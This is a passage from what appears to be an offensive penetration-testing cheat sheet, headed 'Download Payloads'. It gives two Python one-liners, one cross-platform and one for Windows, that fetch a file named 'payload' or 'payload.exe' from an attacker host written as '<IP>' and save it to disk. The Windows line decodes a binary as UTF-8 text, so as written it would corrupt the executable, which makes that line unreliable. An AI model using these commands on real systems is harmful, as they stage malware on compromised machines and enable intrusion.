...
## 04 - Download Payloads

### 4.1 - Cross Platform

```
> python -c 'import requests;print(requests.get("http[s]://<IP>/payload").content.decode("utf-8"))' > payload  
```

### 4.2 - Windows

```
> py -c 'import requests;print(requests.get("http[s]://<IP>/payload.exe").content.decode("utf-8"))' > payload.exe  
```
